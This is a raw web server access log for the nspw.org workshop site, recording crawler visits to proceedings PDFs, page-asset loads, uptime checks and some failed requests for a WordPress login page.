111.206.36.18 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1206 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.144 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 630 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.137 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 742 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.145 - - [28/Apr/2018:15:52:14 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5375 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.19 - - [28/Apr/2018:15:52:14 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 773 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.18 - - [28/Apr/2018:15:52:14 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7375 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.11 - - [28/Apr/2018:15:52:14 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27630 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.144 - - [28/Apr/2018:15:52:14 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
66.249.73.89 - - [28/Apr/2018:15:53:20 -0400] "GET /papers/1997/ HTTP/1.1" 200 4322 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:53:45 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 5928 "-" "Googlebot-Image/1.0"
66.249.73.87 - - [28/Apr/2018:15:54:32 -0400] "GET /2009/stats.txt HTTP/1.1" 200 4061 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.52 - - [28/Apr/2018:15:54:23 -0400] "GET /papers/2010/nspw2010-parkin.pdf HTTP/1.1" 200 921319 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [28/Apr/2018:15:55:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [28/Apr/2018:15:55:43 -0400] "GET /papers/2000/ HTTP/1.1" 200 4372 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:15:56:54 -0400] "GET /papers/2000/nspw2000-perrine.pdf HTTP/1.1" 200 521216 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.206.36.9 - - [28/Apr/2018:15:57:05 -0400] "GET / HTTP/1.1" 200 7085 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.9 - - [28/Apr/2018:15:57:05 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2303 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.9 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1029 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.8 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 902 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.144 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1734 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.11 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 662 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.143 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 630 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.9 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 597 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.134 - - [28/Apr/2018:15:57:06 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1206 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.8 - - [28/Apr/2018:15:57:06 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5375 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.144 - - [28/Apr/2018:15:57:06 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 773 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.11 - - [28/Apr/2018:15:57:06 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.143 - - [28/Apr/2018:15:57:06 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7375 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.9 - - [28/Apr/2018:15:57:06 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27630 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
66.249.73.87 - - [28/Apr/2018:15:58:06 -0400] "GET /papers/2003/nspw2003-duvarney.pdf HTTP/1.1" 200 1060171 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.194 - - [28/Apr/2018:15:58:09 -0400] "GET /papers/2003/nspw2003-beres.pdf HTTP/1.1" 200 732903 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.52 - - [28/Apr/2018:15:58:37 -0400] "GET /papers/2001/nspw2001-weirich.pdf HTTP/1.1" 200 720830 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
112.134.228.92 - - [28/Apr/2018:15:59:11 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.134.228.92 - - [28/Apr/2018:15:59:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [28/Apr/2018:15:59:16 -0400] "GET /papers/2010/ HTTP/1.1" 200 4335 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:16:00:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
125.209.235.168 - - [28/Apr/2018:16:00:26 -0400] "GET /cfp/flyer_NSPW_2014.pdf HTTP/1.1" 200 71521 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
66.249.73.87 - - [28/Apr/2018:16:00:28 -0400] "GET /papers/2005/nspw2005-backmatter.pdf HTTP/1.1" 200 108422 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:16:01:40 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 200 741159 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
112.202.132.114 - - [28/Apr/2018:16:02:47 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.202.132.114 - - [28/Apr/2018:16:02:47 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [28/Apr/2018:16:02:50 -0400] "GET /2017/organizers HTTP/1.1" 200 7136 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:03:01 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 4165 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:03:02 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:03:02 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 3899 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:03:03 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:16:03:03 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 4979 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:03:04 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:03:04 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 599 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:03:05 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:03:05 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:03:06 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2017/organizers" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:04:02 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 200 322223 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:16:05:05 -0400] "GET /2009/proceedings/2006/nspw2006-locasto.pdf HTTP/1.1" 200 166262 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:05:13 -0400] "GET /papers/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 200 464271 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:16:05:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
79.120.196.208 - - [28/Apr/2018:16:05:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.120.196.208 - - [28/Apr/2018:16:05:24 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:16:06:24 -0400] "GET /2015/organizers HTTP/1.1" 200 7089 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [28/Apr/2018:16:06:32 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.91 - - [28/Apr/2018:16:07:36 -0400] "GET /papers/2000/nspw2000-daniels.pdf HTTP/1.1" 200 522507 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
188.70.39.254 - - [28/Apr/2018:16:08:22 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.70.39.254 - - [28/Apr/2018:16:08:23 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [28/Apr/2018:16:08:47 -0400] "GET /papers/2011/nspw2011-pieters.pdf HTTP/1.1" 200 2771026 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:09:59 -0400] "GET /papers/2002/nspw2002-haldar.pdf HTTP/1.1" 200 512210 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:16:10:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [28/Apr/2018:16:11:09 -0400] "GET /papers/1998/nspw1998-kahn.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
191.178.179.207 - - [28/Apr/2018:16:11:43 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
191.178.179.207 - - [28/Apr/2018:16:11:44 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:16:12:21 -0400] "GET /papers/1993/nspw1993-howe.pdf HTTP/1.1" 200 396733 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.143.156 - - [28/Apr/2018:16:12:33 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 9624 "-" "Python-urllib/2.7"
123.125.143.150 - - [28/Apr/2018:16:12:34 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 4339 "-" "Python-urllib/2.7"
123.125.143.9 - - [28/Apr/2018:16:12:35 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 25021 "-" "Python-urllib/2.7"
123.125.143.156 - - [28/Apr/2018:16:12:37 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 5203 "-" "Python-urllib/2.7"
123.125.143.10 - - [28/Apr/2018:16:12:39 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 6165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.10 - - [28/Apr/2018:16:12:41 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.10 - - [28/Apr/2018:16:12:42 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 757 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.10 - - [28/Apr/2018:16:12:44 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.10 - - [28/Apr/2018:16:12:45 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.10 - - [28/Apr/2018:16:12:46 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
172.56.11.202 - - [28/Apr/2018:16:12:58 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:14 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
172.56.11.202 - - [28/Apr/2018:16:13:15 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
66.249.73.89 - - [28/Apr/2018:16:13:32 -0400] "GET /papers/1993/nspw1993-smith.pdf HTTP/1.1" 200 926357 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.98.164.84 - - [28/Apr/2018:16:14:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.98.164.84 - - [28/Apr/2018:16:14:18 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
123.125.143.17 - - [28/Apr/2018:16:14:38 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 9624 "-" "Python-urllib/2.7"
123.125.143.5 - - [28/Apr/2018:16:14:40 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 4339 "-" "Python-urllib/2.7"
123.125.143.17 - - [28/Apr/2018:16:14:42 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 25021 "-" "Python-urllib/2.7"
123.125.143.12 - - [28/Apr/2018:16:14:43 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 5203 "-" "Python-urllib/2.7"
66.249.73.87 - - [28/Apr/2018:16:14:44 -0400] "GET /papers/2003/nspw2003-eustice.pdf HTTP/1.1" 200 698366 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.143.152 - - [28/Apr/2018:16:14:45 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 6165 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.152 - - [28/Apr/2018:16:14:47 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.152 - - [28/Apr/2018:16:14:48 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 757 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.152 - - [28/Apr/2018:16:14:49 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.152 - - [28/Apr/2018:16:14:51 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
123.125.143.152 - - [28/Apr/2018:16:14:52 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
69.162.124.227 - - [28/Apr/2018:16:15:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.70.233.27 - - [28/Apr/2018:16:15:35 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.70.233.27 - - [28/Apr/2018:16:15:37 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:16:15:55 -0400] "GET /2006/cfp/cfpExtension.text HTTP/1.1" 200 6593 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
31.200.148.194 - - [28/Apr/2018:16:16:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
31.200.148.194 - - [28/Apr/2018:16:16:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.154.179.56 - - [28/Apr/2018:16:16:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
82.154.179.56 - - [28/Apr/2018:16:16:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:16:17:10 -0400] "GET /2004/cfp2004.txt HTTP/1.1" 200 6055 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:16:18:18 -0400] "GET /papers/2001/nspw2001-zurko.pdf HTTP/1.1" 200 245947 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.200 - - [28/Apr/2018:16:18:54 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.89 - - [28/Apr/2018:16:19:29 -0400] "GET /papers/1996/nspw1996-williams.pdf HTTP/1.1" 200 664500 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:16:20:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [28/Apr/2018:16:20:17 -0400] "GET /modules/user/user.css?p7kfx6 HTTP/1.1" 200 4456 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:20:18 -0400] "GET /modules/system/system.messages.css?p7kfx6 HTTP/1.1" 200 4140 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:16:20:18 -0400] "GET /modules/system/system.menus.css?p7kfx6 HTTP/1.1" 200 4419 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:20:18 -0400] "GET /modules/system/system.theme.css?p7kfx6 HTTP/1.1" 200 1585 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:16:20:19 -0400] "GET /modules/system/system.base.css?p7kfx6 HTTP/1.1" 200 2307 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:20:19 -0400] "GET /modules/comment/comment.css?p7kfx6 HTTP/1.1" 200 505 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
